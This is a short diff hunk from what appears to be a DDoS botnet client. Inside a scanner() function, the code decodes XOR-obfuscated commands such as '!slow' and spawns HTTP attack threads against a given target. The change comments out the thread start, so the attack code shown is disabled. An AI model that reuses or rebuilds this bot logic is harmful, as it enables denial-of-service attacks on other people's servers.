@@ -273,7 +273,7 @@ def scanner():
 					#stop = False
 					#for _ in range(int(command[3])):
 						#p = threading.Thread(target=HTTP, args =(command[1],command[2],command[4]))
-						p.start()
+						#p.start()
 					#attack+=1
 				#elif command[0] == xor_dec('QAAICRA=',key):#encoded keywords: !slow
 					#if attack != 0:
